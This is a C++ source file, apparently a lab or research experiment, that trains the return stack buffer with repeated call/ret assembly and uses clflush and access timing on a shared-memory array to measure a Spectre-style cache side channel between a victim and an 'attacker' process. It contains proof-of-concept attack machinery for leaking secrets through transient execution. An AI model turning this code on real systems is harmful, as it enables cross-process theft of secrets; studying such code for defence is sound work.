#include "util.hpp"
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sched.h>
#define secret 2
#define nonsecret 200

#define retAsm(i) "call get_rip" #i ";"  "get_rip" #i ":"  "pop %0;" "add $7,%0;" "push %0;" "ret;"

using namespace std;

char* array;
int total = 0, total2 = 0;
int lbl = 0;

inline void timeAndFlush(ADDR_PTR addr) {
	printAccessTime(addr);
	// clflush((void *)addr);
}

volatile void spacer2() {
	asm(
		".rept 2195;"
		"nop;"
		".endr;"
	);
}

void exploit() { // this should be at the same VA as attacker:gadget()
	volatile int temp = array[secret*offset];
}

void trickMe() {
	ADDR_PTR address, tmp;

	for (int i = 0; i<10000;i++) {
		// deepCallStack(16);
		//sched_yield();
		asm(
			retAsm(1)
			retAsm(2)
			retAsm(3)
			retAsm(4)
			retAsm(5)
			retAsm(6)
			retAsm(7)
			retAsm(8)
			retAsm(9)
			retAsm(10)
			retAsm(11)
			retAsm(12)
			retAsm(13)
			retAsm(14)
			retAsm(15)
			retAsm(16)
			: "=r" (tmp)
			: "r" (address)
		);
	
		//exploit();
		// timeAndFlush((ADDR_PTR)&array[secret]);
		total += measure_one_block_access_time((ADDR_PTR)&array[secret*offset]);
		total2 += measure_one_block_access_time((ADDR_PTR)&array[nonsecret*offset]);
		clflush((void *)&array[secret*offset]);
		clflush((void *)&array[nonsecret*offset]);
	}
}

int main(){
	const int SIZE = 1<<20; 
	// shared memory is named Sally because Rob doesn't know anyone named Sally
    const char* name = "Sally";
    char temp;
    // shared memory file descriptor
    int shm_fd;  
    // pointer to shared memory obect
    // create the shared memory object
    shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666); 
    // configure the size of the shared memory object
    ftruncate(shm_fd, SIZE); 
    // memory map the shared memory object
    array = (char*)mmap(0, SIZE, PROT_WRITE, MAP_SHARED, shm_fd, 0); 
	
	clflush(&array[secret*offset]);
	clflush(&array[nonsecret*offset]);

	trickMe();

	printf("avg time for secret1 is %f\n", total/10000.0);
	printf("avg time for secret2 is %f\n", total2/10000.0);
	// printf("diff avg time is %f\n", total2/1000.0 - total/1000.0);

	// for(int i = 0; i < 10000; i++) {
	// 	printf("%u\n", times[i]);
	// }

	// string buffer;
	// char temp;
	// volatile int i = 0;

	// ifstream secretFile("secret");
	// if(secretFile.is_open()){
	// 	getline(secretFile, buffer);
	// 	secretFile.close();
	// }

	// string secret = buffer;
	// temp &= array[secret[i]*256]; // vulneralbility

	// while(true){
	// 	foo();
	// 	measureAccessTime();
	// }

	return 0;
}